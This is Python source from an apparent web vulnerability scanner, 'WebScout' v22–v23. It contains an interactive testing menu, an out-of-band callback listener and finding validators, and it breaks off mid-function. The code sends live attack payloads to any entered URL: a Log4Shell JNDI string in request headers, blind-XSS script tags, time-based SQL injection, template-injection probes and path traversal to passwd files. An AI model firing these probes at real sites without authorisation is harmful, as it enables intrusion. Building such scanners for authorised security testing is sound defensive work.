# ════════════════════════════════════════════════════════════════════════
#  v22 — Manual Testing Mode (وضع الاختبار اليدوي)
#  Interactive CLI mode — lets the tester run individual modules
#  against a target URL one at a time, inspect results, and repeat.
#  Activate with:  python webscout_v22.py --manual
# ════════════════════════════════════════════════════════════════════════

class ManualTestingMode:
    """
    Interactive manual testing session (v22).
    Prompts the user to enter a target URL, select a module,
    configure options, and view results — all without leaving the terminal.
    """

    MENU = """
╔══════════════════════════════════════════════════════════════╗
║           WebScout v22 — وضع الاختبار اليدوي                ║
║              Manual Testing Mode (Interactive)               ║
╠══════════════════════════════════════════════════════════════╣
║  [1]  SQLi — Enhanced SQL Injection Scanner                  ║
║  [2]  XSS  — Enhanced XSS Scanner (context-aware)           ║
║  [3]  SSTI — Server-Side Template Injection                  ║
║  [4]  Path Traversal / LFI                                   ║
║  [5]  SSRF — Server-Side Request Forgery                     ║
║  [6]  Open Redirect                                          ║
║  [7]  CORS Misconfiguration                                  ║
║  [8]  Clickjacking (X-Frame-Options)                         ║
║  [9]  Host Header Injection                                  ║
║  [10] Rate Limiting                                          ║
║  [11] Security Headers Deep Analysis                         ║
║  [12] TLS/SSL Scan                                           ║
║  [13] WAF Bypass Fuzzer                                      ║
║  [14] Smart Payload Scan (Auto-detect best payload type)     ║
║  [15] Custom Payload — Enter your own payload manually       ║
║  [99] Change Target URL                                      ║
║  [0]  Exit                                                   ║
╚══════════════════════════════════════════════════════════════╝
"""

    def __init__(self):
        self.target: str = ""
        self.session_findings: list = []
        self.proxy: str = ""
        self.cookies: str = ""
        self.headers: dict = {}
        self.verbose: bool = True

    def _input(self, prompt: str, default: str = "") -> str:
        try:
            val = input(prompt).strip()
            return val if val else default
        except (EOFError, KeyboardInterrupt):
            return default

    def _make_cfg(self) -> "ScanConfig":
        return ScanConfig(
            timeout=30, concurrency=5, delay=0.1,
            rate_limit=30, retries=2,
            proxy=self.proxy, verbose=self.verbose,
            proxy_list=[],
            cookies=self.cookies,
            custom_headers=self.headers,
        )

    async def _run_module(self, module_id: str, client: "WebScoutClient") -> list:
        """Dispatch to the appropriate scanner based on menu selection."""
        url = self.target
        findings = []

        try:
            if module_id == "1":
                print(f"\n[SQLi] Scanning: {url}")
                scanner = EnhancedSQLiScanner()
                findings = await scanner.scan(client, url)

            elif module_id == "2":
                print(f"\n[XSS] Scanning: {url}")
                scanner = EnhancedXSSScanner()
                findings = await scanner.scan(client, url)

            elif module_id == "3":
                print(f"\n[SSTI] Scanning: {url}")
                try:
                    scanner = SSTIScanner()
                    findings = await scanner.scan(client, url)
                except NameError:
                    print("  [!] SSTI scanner not available in this build")

            elif module_id == "4":
                print(f"\n[Path Traversal] Scanning: {url}")
                scanner = PathTraversalScanner()
                findings = await scanner.scan(client, url)

            elif module_id == "5":
                print(f"\n[SSRF] Scanning: {url}")
                try:
                    scanner = SSRFScanner()
                    findings = await scanner.scan(client, url)
                except NameError:
                    print("  [!] SSRF scanner not available in this build")

            elif module_id == "6":
                print(f"\n[Open Redirect] Scanning: {url}")
                scanner = OpenRedirectScanner()
                findings = await scanner.scan(client, url)

            elif module_id == "7":
                print(f"\n[CORS] Scanning: {url}")
                scanner = EnhancedCORSScanner()
                findings = await scanner.scan(client, url)

            elif module_id == "8":
                print(f"\n[Clickjacking] Scanning: {url}")
                scanner = ClickjackingScanner()
                findings = await scanner.scan(client, url)

            elif module_id == "9":
                print(f"\n[Host Header Injection] Scanning: {url}")
                scanner = HostHeaderInjectionScanner()
                findings = await scanner.scan(client, url)

            elif module_id == "10":
                burst = int(self._input("  Burst count (default 20): ", "20"))
                print(f"\n[Rate Limit] Scanning with burst={burst}: {url}")
                scanner = RateLimitScanner(burst=burst)
                findings = await scanner.scan(client, url)

            elif module_id == "11":
                print(f"\n[Security Headers] Scanning: {url}")
                try:
                    scanner = SecurityHeadersDeepScanner()
                    findings = await scanner.scan(client, url)
                except NameError:
                    print("  [!] SecurityHeadersDeepScanner not available — trying basic")

            elif module_id == "12":
                print(f"\n[TLS/SSL] Scanning: {url}")
                try:
                    scanner = TLSScanner()
                    findings = await scanner.scan(client, url)
                except NameError:
                    print("  [!] TLS scanner not available in this build")

            elif module_id == "13":
                print(f"\n[WAF Fuzzer] Scanning: {url}")
                scanner = WAFBypassFuzzer()
                findings = await scanner.scan(client, url)

            elif module_id == "14":
                print(f"\n[Smart Payload] Scanning: {url}")
                engine = SmartPayloadEngine()
                findings = await engine.scan(client, url)

            elif module_id == "15":
                param = self._input("  Parameter name to inject into: ", "id")
                payload = self._input("  Enter your payload: ", "")
                if not payload:
                    print("  [!] No payload entered — skipping")
                    return []
                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                parsed  = urlparse(url)
                params  = parse_qs(parsed.query)
                params[param] = [payload]
                new_url = urlunparse(parsed._replace(query=urlencode({k: v[0] for k, v in params.items()})))
                print(f"  Sending: {new_url}")
                r = await client.get(new_url)
                if r:
                    print(f"  Status : {r['status']}")
                    print(f"  Length : {r['length']}")
                    preview = r['text'][:500].replace('\n', ' ')
                    print(f"  Preview: {preview}")
                else:
                    print("  [!] No response received")
                return []

            else:
                print(f"  [!] Unknown module: {module_id}")
                return []

        except asyncio.CancelledError:
            print("  [!] Scan cancelled")
            return []
        except Exception as e:
            print(f"  [!] Module error: {e}")
            if self.verbose:
                import traceback
                traceback.print_exc()
            return []

        return findings

    def _print_findings(self, findings: list):
        if not findings:
            print("  ✓ No issues found for this module.")
            return
        print(f"\n  ► {len(findings)} finding(s):\n")
        for i, f in enumerate(findings, 1):
            sev_color = {
                "CRITICAL": "\033[91m", "HIGH": "\033[93m",
                "MEDIUM": "\033[33m", "LOW": "\033[34m",
            }.get(f.severity, "\033[0m")
            reset = "\033[0m"
            print(f"  [{i}] {sev_color}{f.severity}{reset} — {f.title}")
            print(f"       Confidence : {f.confidence:.0f}%")
            if f.url:
                print(f"       URL        : {f.url[:100]}")
            if f.evidence:
                print(f"       Evidence   : {f.evidence[:120]}")
            if f.remediation:
                print(f"       Fix        : {f.remediation[:100]}")
            print()

    def _export_session(self):
        """Export accumulated session findings to JSON."""
        if not self.session_findings:
            print("  No findings to export yet.")
            return
        path = f"manual_session_{int(time.time())}.json"
        try:
            with open(path, "w", encoding="utf-8") as fp:
                import json as _j
                _j.dump(
                    [f.__dict__ if hasattr(f, '__dict__') else str(f) for f in self.session_findings],
                    fp, indent=2, default=str
                )
            print(f"  ✓ Session findings exported to: {path}")
        except Exception as e:
            print(f"  [!] Export failed: {e}")

    async def run(self):
        """Main interactive loop."""
        print("\n" + "="*64)
        print("  WebScout v22 — Manual Testing Mode")
        print("  وضع الاختبار اليدوي التفاعلي")
        print("="*64)

        # Get initial target
        while not self.target:
            url = self._input("\nTarget URL: ").strip()
            if not url:
                continue
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            self.target = url

        self.proxy   = self._input(f"Proxy (leave blank for none): ", "")
        self.cookies = self._input(f"Cookies (format: k1=v1; k2=v2): ", "")
        extra_hdr    = self._input(f"Extra header (K:V, or blank): ", "")
        if ":" in extra_hdr:
            k, v = extra_hdr.split(":", 1)
            self.headers[k.strip()] = v.strip()

        cfg    = self._make_cfg()
        client = WebScoutClient(cfg)

        print(f"\n  Target : {self.target}")
        print(f"  Proxy  : {self.proxy or 'none (direct)'}")
        print()

        try:
            while True:
                print(self.MENU)
                choice = self._input("Select module [0-15, 99]: ", "0").strip()

                if choice == "0":
                    self._export_session()
                    print("\n  Exiting manual mode. Goodbye!")
                    break

                elif choice == "99":
                    new_url = self._input("New target URL: ", self.target).strip()
                    if new_url:
                        if not new_url.startswith(("http://", "https://")):
                            new_url = "https://" + new_url
                        self.target = new_url
                        print(f"  ✓ Target changed to: {self.target}")
                    continue

                print(f"\n  Running module [{choice}] against: {self.target}")
                t0 = time.monotonic()
                findings = await self._run_module(choice, client)
                elapsed = time.monotonic() - t0

                self._print_findings(findings)
                self.session_findings.extend(findings)
                print(f"  Time: {elapsed:.1f}s | Session total: {len(self.session_findings)} finding(s)")

                cont = self._input("  Run another module? [Y/n]: ", "y").lower()
                if cont in ("n", "no", "q", "quit"):
                    self._export_session()
                    print("\n  Exiting manual mode. Goodbye!")
                    break
        finally:
            await client.close()



# ════════════════════════════════════════════════════════════════════════
#  v23 ── ENGINE 1: OOB Confirmation (تأكيد خارج النطاق)
#  Built-in HTTP listener that catches callbacks from SSRF/XXE/
#  Blind-XSS/Log4Shell payloads. Each payload gets a unique token.
#  If the token arrives at our listener → 100% confirmed.
#  Also supports external interactsh-client when available.
# ════════════════════════════════════════════════════════════════════════

import http.server, threading, socket, secrets, queue as _queue_mod

class OOBConfirmationEngine:
    """
    Out-of-Band confirmation engine (v23).
    Starts a local HTTP listener on a random free port.
    Generates unique 16-char hex tokens per payload.
    Any HTTP request hitting /TOKEN confirms the interaction.

    Usage:
        oob = OOBConfirmationEngine()
        await oob.start()
        token, url = oob.new_token()          # embed url in payload
        # ... send payload to target ...
        confirmed = await oob.wait_for(token, timeout=15)
        await oob.stop()
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 0,
                 public_host: str = ""):
        self._host       = host
        self._port       = port          # 0 = pick free port
        self._pub_host   = public_host   # override for external reachability
        self._tokens: dict = {}          # token -> asyncio.Event
        self._server     = None
        self._thread     = None
        self._loop       = None
        self._hit_queue  = _queue_mod.Queue()
        self.listen_url  = ""

    # ── Lifecycle ────────────────────────────────────────────────────
    async def start(self):
        self._loop = asyncio.get_event_loop()
        engine_ref = self

        class _Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                token = self.path.strip("/").split("/")[0][:32]
                engine_ref._hit_queue.put(token)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")
            def do_POST(self):
                self.do_GET()
            def log_message(self, *a):
                pass  # suppress console noise

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self._host, self._port))
        self._port = sock.getsockname()[1]
        sock.listen(32)

        self._server = http.server.HTTPServer.__new__(http.server.HTTPServer)
        self._server.__dict__.update({
            'socket': sock,
            'server_address': (self._host, self._port),
            'RequestHandlerClass': _Handler,
            '_BaseServer__is_shut_down': threading.Event(),
            '_BaseServer__shutdown_request': False,
        })
        http.server.HTTPServer.__init__(self._server, (self._host, self._port), _Handler)

        self._thread = threading.Thread(target=self._server.serve_forever,
                                        daemon=True, name="OOBListener")
        self._thread.start()

        pub = self._pub_host or self._get_local_ip()
        self.listen_url = f"http://{pub}:{self._port}"
        log("INFO", f"[OOB] Listener started at {self.listen_url}")

        # Start background token resolver
        asyncio.create_task(self._resolve_loop())

    async def _resolve_loop(self):
        """Drain hit_queue and set matching events."""
        while True:
            await asyncio.sleep(0.3)
            while not self._hit_queue.empty():
                try:
                    token = self._hit_queue.get_nowait()
                    if token in self._tokens:
                        self._tokens[token].set()
                        log("OK", f"[OOB] Token confirmed: {token}")
                except Exception:
                    pass

    async def stop(self):
        if self._server:
            self._server.shutdown()
        log("INFO", "[OOB] Listener stopped")

    # ── Token management ────────────────────────────────────────────
    def new_token(self, label: str = "") -> tuple:
        """
        Returns (token, callback_url).
        Embed callback_url in your payload.
        """
        token = secrets.token_hex(8)   # 16-char hex
        ev = asyncio.Event()
        self._tokens[token] = ev
        url = f"{self.listen_url}/{token}"
        return token, url

    async def wait_for(self, token: str, timeout: float = 15.0) -> bool:
        """
        Wait up to `timeout` seconds for token to be called back.
        Returns True if confirmed, False if timed out.
        """
        ev = self._tokens.get(token)
        if not ev:
            return False
        try:
            await asyncio.wait_for(ev.wait(), timeout=timeout)
            return True
        except asyncio.TimeoutError:
            return False
        finally:
            self._tokens.pop(token, None)

    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    # ── High-level helpers ───────────────────────────────────────────
    async def confirm_ssrf(self, client: "WebScoutClient",
                           url: str, param: str = "url") -> bool:
        """
        Inject OOB URL into `param` and check for callback.
        Returns True if SSRF confirmed.
        """
        token, cb_url = self.new_token("ssrf")
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [cb_url]
        test_url = urlunparse(parsed._replace(
            query=urlencode({k: v[0] for k, v in params.items()})
        ))
        await client.get(test_url)
        return await self.wait_for(token, timeout=12)

    async def confirm_log4shell(self, client: "WebScoutClient",
                                url: str) -> bool:
        """
        Send Log4Shell payload in common headers and wait for DNS/HTTP callback.
        Returns True if confirmed.
        """
        token, cb_url = self.new_token("log4shell")
        cb_host = cb_url.replace("http://", "")
        payload = f"${{jndi:ldap://{cb_host}/a}}"
        headers = {
            "User-Agent":    payload,
            "X-Forwarded-For": payload,
            "Referer":       payload,
            "X-Api-Version": payload,
            "Accept-Language": payload,
        }
        await client.get(url, headers=headers)
        return await self.wait_for(token, timeout=12)

    async def confirm_blind_xss(self, client: "WebScoutClient",
                                url: str, param: str) -> bool:
        """
        Inject blind XSS payload with OOB callback and wait.
        """
        token, cb_url = self.new_token("blind_xss")
        payload = (
            f'"><script src="{cb_url}"></script>'
            f'<img src="{cb_url}/{token}" onerror="this.src=\'{cb_url}\'">'
        )
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        test_url = urlunparse(parsed._replace(
            query=urlencode({k: v[0] for k, v in params.items()})
        ))
        await client.get(test_url)
        return await self.wait_for(token, timeout=15)


# ════════════════════════════════════════════════════════════════════════
#  v23 ── ENGINE 2: Triple-Confirm Engine (محرك التأكيد الثلاثي)
#  For every finding, sends 3 targeted requests:
#    Request A — original payload          (should trigger)
#    Request B — canary (random junk)      (should NOT trigger)
#    Request C — inverted/neutral payload  (should NOT trigger)
#  If B or C also triggers → False Positive → discard.
#  Confidence scoring based on differential response analysis.
# ════════════════════════════════════════════════════════════════════════

class TripleConfirmEngine:
    """
    Triple-confirm post-scan validator (v23).
    Re-tests every finding with 3 requests to eliminate false positives.
    Only findings that pass all 3 checks are kept at full confidence.
    Borderline findings are downgraded, not removed.
    """

    # Maximum findings to re-test (performance guard)
    MAX_RETEST = 200

    async def validate(self, findings: list,
                       client: "WebScoutClient") -> list:
        """
        Main entry point. Returns validated (filtered + re-scored) findings.
        """
        if not findings:
            return findings

        to_test = findings[:self.MAX_RETEST]
        rest    = findings[self.MAX_RETEST:]

        log("INFO", f"[TripleConfirm] Re-testing {len(to_test)} findings …")
        validated = []

        for f in to_test:
            result = await self._triple_test(f, client)
            if result == "CONFIRMED":
                f.confidence = min(99.0, f.confidence + 5)
                validated.append(f)
            elif result == "DOWNGRADE":
                f.confidence = max(0, f.confidence - 25)
                f.title = f"[Unconfirmed] {f.title}"
                if f.confidence >= 40:
                    validated.append(f)
                else:
                    log("INFO", f"[TripleConfirm] Discarded FP: {f.title}")
            elif result == "FP":
                log("INFO", f"[TripleConfirm] False Positive removed: {f.title}")
                # Don't add to validated
            else:
                validated.append(f)  # SKIP — couldn't re-test

        validated.extend(rest)
        removed = len(to_test) - (len(validated) - len(rest))
        log("OK", f"[TripleConfirm] Done — kept {len(validated)}, "
                  f"removed/downgraded {removed} findings")
        return validated

    async def _triple_test(self, finding, client) -> str:
        """
        Returns: 'CONFIRMED' | 'FP' | 'DOWNGRADE' | 'SKIP'
        """
        url     = getattr(finding, "url", "") or ""
        param   = getattr(finding, "param", "") or ""
        payload = getattr(finding, "payload", "") or ""
        plugin  = getattr(finding, "plugin", "") or ""

        if not url or not url.startswith(("http://", "https://")):
            return "SKIP"

        # ── Route to specialised checker ─────────────────────────────
        try:
            if "sqli" in plugin or "sql" in plugin:
                return await self._confirm_sqli(url, param, payload, client)
            elif "xss" in plugin:
                return await self._confirm_xss(url, param, payload, client)
            elif "ssti" in plugin:
                return await self._confirm_ssti(url, param, payload, client)
            elif "path_traversal" in plugin or "lfi" in plugin:
                return await self._confirm_traversal(url, param, payload, client)
            elif "redirect" in plugin:
                return await self._confirm_redirect(url, param, payload, client)
            elif "cors" in plugin:
                return await self._confirm_cors(url, client)
            else:
                return "SKIP"
        except Exception as e:
            log("WARN", f"[TripleConfirm] Error re-testing {plugin}: {e}")
            return "SKIP"

    async def _confirm_sqli(self, url, param, payload, client) -> str:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params and not param:
            return "SKIP"

        # Build canary and inverted payloads
        canary  = f"ws23_{secrets.token_hex(4)}_canary"
        neutral = "1"

        def _make_url(p_val):
            pmap = {k: v[0] for k, v in params.items()}
            if param:
                pmap[param] = p_val
            return urlunparse(parsed._replace(query=urlencode(pmap)))

        sql_errors = [
            "sql syntax", "mysql_fetch", "ora-", "sqlite3.operational",
            "pg_query", "unclosed quotation", "you have an error in your sql",
            "sql server", "syntax error near", "odbc sql", "invalid query",
            "division by zero", "table or view does not exist",
        ]

        r_orig    = await client.get(_make_url(payload))
        r_canary  = await client.get(_make_url(canary))
        r_neutral = await client.get(_make_url(neutral))

        if not r_orig:
            return "SKIP"

        body_orig    = (r_orig.get("text", "") or "").lower()
        body_canary  = (r_canary.get("text", "") if r_canary else "").lower()
        body_neutral = (r_neutral.get("text", "") if r_neutral else "").lower()

        orig_has_err    = any(e in body_orig for e in sql_errors)
        canary_has_err  = any(e in body_canary for e in sql_errors)
        neutral_has_err = any(e in body_neutral for e in sql_errors)

        if orig_has_err and not canary_has_err and not neutral_has_err:
            return "CONFIRMED"
        if canary_has_err or neutral_has_err:
            return "FP"
        if orig_has_err:
            return "DOWNGRADE"
        return "SKIP"

    async def _confirm_xss(self, url, param, payload, client) -> str:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params and not param:
            return "SKIP"

        # Use math-unique XSS marker
        marker = f"ws23xss{secrets.token_hex(3)}"
        test_payload = f'<script>/*{marker}*/</script>'
        canary       = f"ws23_{secrets.token_hex(4)}"

        def _make_url(p_val):
            pmap = {k: v[0] for k, v in params.items()}
            if param:
                pmap[param] = p_val
            return urlunparse(parsed._replace(query=urlencode(pmap)))

        r_test   = await client.get(_make_url(test_payload))
        r_canary = await client.get(_make_url(canary))

        if not r_test:
            return "SKIP"

        body_test   = r_test.get("text", "") or ""
        body_canary = (r_canary.get("text", "") if r_canary else "")

        marker_reflected  = marker in body_test
        canary_reflected  = canary in body_canary

        if marker_reflected and not canary_reflected:
            return "CONFIRMED"
        if canary_reflected and marker_reflected:
            return "DOWNGRADE"   # Both reflect — server echoes everything
        return "SKIP"

    async def _confirm_ssti(self, url, param, payload, client) -> str:
        """Math-proof SSTI: use unique random numbers."""
        import random as _r
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params and not param:
            return "SKIP"

        A = _r.randint(100, 999)
        B = _r.randint(100, 999)
        expected = str(A * B)

        probes = [
            f"{{{{{A}*{B}}}}}",   # Jinja2/Twig
            f"${{{A}*{B}}}",      # Freemarker/Mako
            f"@{{{A}*{B}}}",      # SpEL
            f"<%= {A}*{B} %>",    # ERB
        ]

        def _make_url(p_val):
            pmap = {k: v[0] for k, v in params.items()}
            if param:
                pmap[param] = p_val
            return urlunparse(parsed._replace(query=urlencode(pmap)))

        for probe in probes:
            r = await client.get(_make_url(probe))
            if r and expected in (r.get("text", "") or ""):
                log("OK", f"[TripleConfirm/SSTI] Math-proof confirmed: {probe} = {expected}")
                return "CONFIRMED"

        return "DOWNGRADE"

    async def _confirm_traversal(self, url, param, payload, client) -> str:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params and not param:
            return "SKIP"

        LINUX_MARKERS   = ["root:x:0:0", "daemon:", "/bin/bash", "nobody:x:"]
        WINDOWS_MARKERS = ["[extensions]", "for 16-bit app", "Windows IP"]

        def _make_url(p_val):
            pmap = {k: v[0] for k, v in params.items()}
            if param:
                pmap[param] = p_val
            return urlunparse(parsed._replace(query=urlencode(pmap)))

        canary = f"../../../etc/ws23_canary_{secrets.token_hex(4)}"
        r_real   = await client.get(_make_url(payload))
        r_canary = await client.get(_make_url(canary))

        if not r_real:
            return "SKIP"

        body_real   = r_real.get("text", "") or ""
        body_canary = (r_canary.get("text", "") if r_canary else "")

        real_hit   = any(m in body_real for m in LINUX_MARKERS + WINDOWS_MARKERS)
        canary_hit = any(m in body_canary for m in LINUX_MARKERS + WINDOWS_MARKERS)

        if real_hit and not canary_hit:
            return "CONFIRMED"
        if canary_hit:
            return "FP"
        return "DOWNGRADE"

    async def _confirm_redirect(self, url, param, payload, client) -> str:
        r = await client.get(url, allow_redirects=False)
        if not r:
            return "SKIP"
        location = r.get("headers", {}).get("Location", "")
        if r.get("status", 0) in (301, 302, 303, 307, 308):
            if "evil.webscout-test.example" in location or payload in location:
                return "CONFIRMED"
        return "DOWNGRADE"

    async def _confirm_cors(self, url, client) -> str:
        evil = "https://evil.webscout-test.example"
        r = await client.get(url, headers={"Origin": evil})
        if not r:
            return "SKIP"
        acao = r.get("headers", {}).get("Access-Control-Allow-Origin", "")
        acac = r.get("headers", {}).get("Access-Control-Allow-Credentials", "").lower()
        if (acao == evil or acao == "*") and acac == "true":
            return "CONFIRMED"
        if acao == evil:
            return "DOWNGRADE"
        return "FP"


# ════════════════════════════════════════════════════════════════════════
#  v23 ── ENGINE 3: Deep Accuracy Validator (محرك التحقق العميق)
#  Post-scan deep re-tester achieving near 100% accuracy by combining:
#    1. Time-based 5-sample median for blind SQLi
#    2. Differential boolean analysis (AND 1=1 vs AND 1=2)
#    3. Entropy analysis for secret/key findings
#    4. Header re-verification for clickjacking/CORS/security-headers
#    5. Replay + diff for all remaining findings
# ════════════════════════════════════════════════════════════════════════

class DeepAccuracyValidator:
    """
    Deep accuracy post-scan validator (v23).
    Applies specialised confirmation strategy per vulnerability class.
    Call after TripleConfirmEngine for maximum precision.
    """

    # Minimum confidence to keep a finding after deep validation
    MIN_CONFIDENCE = 45.0

    async def validate(self, findings: list,
                       client: "WebScoutClient") -> list:
        if not findings:
            return findings

        log("INFO", f"[DeepValidator] Starting deep validation of {len(findings)} findings …")
        output = []

        for f in findings:
            plugin = getattr(f, "plugin", "") or ""
            try:
                if "sqli" in plugin or "sql" in plugin:
                    f = await self._deep_sqli(f, client)
                elif "ssti" in plugin:
                    f = await self._deep_ssti(f, client)
                elif "secret" in plugin or "sensitive" in plugin or "exposure" in plugin:
                    f = await self._deep_entropy(f, client)
                elif "clickjacking" in plugin or "cors" in plugin or "header" in plugin:
                    f = await self._deep_header(f, client)
                elif "rate_limit" in plugin:
                    f = await self._deep_rate_limit(f, client)
                else:
                    f = await self._deep_replay(f, client)
            except Exception as e:
                log("WARN", f"[DeepValidator] Error on {plugin}: {e}")

            if f is not None and getattr(f, "confidence", 0) >= self.MIN_CONFIDENCE:
                output.append(f)

        removed = len(findings) - len(output)
        log("OK", f"[DeepValidator] Complete — {len(output)} confirmed, "
                  f"{removed} removed as low-confidence")
        return output

    async def _deep_sqli(self, f, client):
        """
        5-sample median time-based confirmation + differential boolean.
        """
        url   = getattr(f, "url", "") or ""
        param = getattr(f, "param", "") or ""
        if not url or not param:
            return f

        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed  = urlparse(url)
        params  = parse_qs(parsed.query)

        def _make(p_val):
            pmap = {k: v[0] for k, v in params.items()}
            pmap[param] = p_val
            return urlunparse(parsed._replace(query=urlencode(pmap)))

        # ── Differential boolean: AND 1=1 (true) vs AND 1=2 (false)
        u_true  = _make("1 AND 1=1")
        u_false = _make("1 AND 1=2")

        r_true  = await client.get(u_true)
        r_false = await client.get(u_false)

        if r_true and r_false:
            len_true  = r_true.get("length", 0)
            len_false = r_false.get("length", 0)
            diff_pct  = abs(len_true - len_false) / max(len_true, 1)

            if diff_pct > 0.12:   # > 12% body difference = Boolean SQLi confirmed
                f.confidence = min(99.0, f.confidence + 15)
                f.evidence = (
                    f"{f.evidence or ''} | BooleanSQLi confirmed: "
                    f"AND 1=1 len={len_true}, AND 1=2 len={len_false} "
                    f"(diff={diff_pct*100:.1f}%)"
                )
                log("OK", f"[DeepValidator/SQLi] Boolean differential confirmed ({diff_pct*100:.1f}%)")
                return f

        # ── Time-based: 5 samples with SLEEP(3) vs baseline
        SLEEP_PAYLOADS = [
            "1' AND SLEEP(3)--",
            "1; WAITFOR DELAY '0:0:3'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
            "1 AND pg_sleep(3)--",
        ]
        baselines = []
        for _ in range(3):
            t0 = time.monotonic()
            r  = await client.get(_make("1"))
            if r:
                baselines.append((time.monotonic() - t0) * 1000)

        if not baselines:
            return f

        base_median = sorted(baselines)[len(baselines) // 2]

        for sp in SLEEP_PAYLOADS:
            t0 = time.monotonic()
            r  = await client.get(_make(sp))
            elapsed_ms = (time.monotonic() - t0) * 1000
            delta = elapsed_ms - base_median

            if delta >= 2800:   # ≥2.8s delay over baseline = confirmed
                f.confidence = min(99.0, f.confidence + 20)
                f.evidence = (
                    f"{f.evidence or ''} | TimeSQLi: SLEEP(3) caused "
                    f"{elapsed_ms:.0f}ms vs baseline {base_median:.0f}ms "
                    f"(Δ={delta:.0f}ms)"
                )
                log("OK", f"[DeepValidator/SQLi] Time-based confirmed Δ={delta:.0f}ms")
                return f

        # No confirmation achieved — downgrade slightly
        f.confidence = max(0, f.confidence - 10)
        return f

    async def _deep_ssti(self, f, client):
        """Math-proof SSTI with 5 different template engines."""
        import random as _r
        url   = getattr(f, "url", "") or ""
        param = getattr(f, "param", "") or ""
        if not url or not param:
            return f

        A = _r.randint(1000, 9999)
        B = _r.randint(1000, 9999)
        expected = str(A * B)

        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        def _make(p_val):
            pmap = {k: v[0] for k, v in params.items()}
            pmap[param] = p_val
            return urlunparse(parsed._replace(query=urlencode(pmap)))

        probes = [
            (f"{{{{{A}*{B}}}}}", "Jinja2/Twig"),
            (f"${{{A}*{B}}}", "Freemarker/Mako"),
            (f"@{{{A}*{B}}}", "SpEL"),
            (f"<%= {A}*{B} %>", "ERB"),
            (f"*{{{A}*{B}}}", "SpEL-alt"),
        ]

        for probe, engine in probes:
            r = await client.get(_make(probe))
            if r and expected in (r.get("text", "") or ""):
                f.confidence = 99.0
                f.evidence = (
                    f"{f.evidence or ''} | SSTI math-proof: "
                    f"{probe} = {expected} ({engine} confirmed)"
                )
                log("OK", f"[DeepValidator/SSTI] {engine} confirmed: {probe} = {expected}")
                return f

        f.confidence = max(0, f.confidence - 20)
        return f

    async def _deep_entropy(self, f, client):
        """
        Re-fetch the URL and measure Shannon entropy of discovered value.
        High entropy (>4.5) = likely real secret/key/token.
        """
        import math
        from collections import Counter

        url = getattr(f, "url", "") or ""
        if not url:
            return f

        r = await client.get(url)
        if not r:
            return f

        body = r.get("text", "") or ""
        # Look for high-entropy strings (32+ non-space chars)
        import re as _re
        candidates = _re.findall(r'[A-Za-z0-9+/=_\-]{32,}', body)

        def _entropy(s):
            if not s:
                return 0
            counts = Counter(s)
            total  = len(s)
            return -sum((c/total) * math.log2(c/total) for c in counts.values())

        high_entropy = [c for c in candidates if _entropy(c) > 4.5]

        if high_entropy:
            f.confidence = min(99.0, f.confidence + 10)
            f.evidence = (
                f"{f.evidence or ''} | Entropy confirmed: "
                f"{len(high_entropy)} high-entropy string(s) found "
                f"(entropy > 4.5 bits)"
            )
        else:
            f.confidence = max(0, f.confidence - 15)
        return f

    async def _deep_header(self, f, client):
        """Re-fetch and re-check security headers."""
        url = getattr(f, "url", "") or ""
        if not url:
            return f

        r = await client.get(url)
        if not r:
            return f

        hdrs_lower = {k.lower(): v for k, v in (r.get("headers", {}) or {}).items()}
        plugin = getattr(f, "plugin", "") or ""

        if "clickjacking" in plugin:
            xfo = hdrs_lower.get("x-frame-options", "")
            csp = hdrs_lower.get("content-security-policy", "")
            if not xfo and "frame-ancestors" not in csp.lower():
                f.confidence = min(99.0, f.confidence + 10)
                return f
            f.confidence = max(0, f.confidence - 30)

        elif "cors" in plugin:
            origin_test = "https://evil.webscout-test.example"
            r2 = await client.get(url, headers={"Origin": origin_test})
            if r2:
                acao = (r2.get("headers", {}) or {}).get("Access-Control-Allow-Origin", "")
                acac = (r2.get("headers", {}) or {}).get("Access-Control-Allow-Credentials", "").lower()
                if acao in (origin_test, "*") and acac == "true":
                    f.confidence = min(99.0, f.confidence + 15)
                    return f
            f.confidence = max(0, f.confidence - 20)

        else:
            # Generic header check — just confirm the URL is alive
            if r.get("status", 0) in (200, 301, 302, 403):
                f.confidence = min(99.0, f.confidence + 5)

        return f

    async def _deep_rate_limit(self, f, client):
        """Send 20 rapid requests and confirm throttling absent."""
        url = getattr(f, "url", "") or ""
        if not url:
            return f

        tasks   = [client.get(url) for _ in range(20)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        statuses = [r.get("status", 0) for r in results if isinstance(r, dict)]

        THROTTLE = {429, 503, 423, 420}
        throttled = sum(1 for s in statuses if s in THROTTLE)

        if throttled == 0 and len(statuses) >= 15:
            f.confidence = min(99.0, f.confidence + 15)
            f.evidence = (
                f"{f.evidence or ''} | DeepValidation: 20 rapid requests, "
                f"0 throttled — rate limit confirmed absent"
            )
        elif throttled > 5:
            # Actually throttled — finding may be wrong
            f.confidence = max(0, f.confidence - 40)
        return f

    async def _deep_replay(self, f, client):
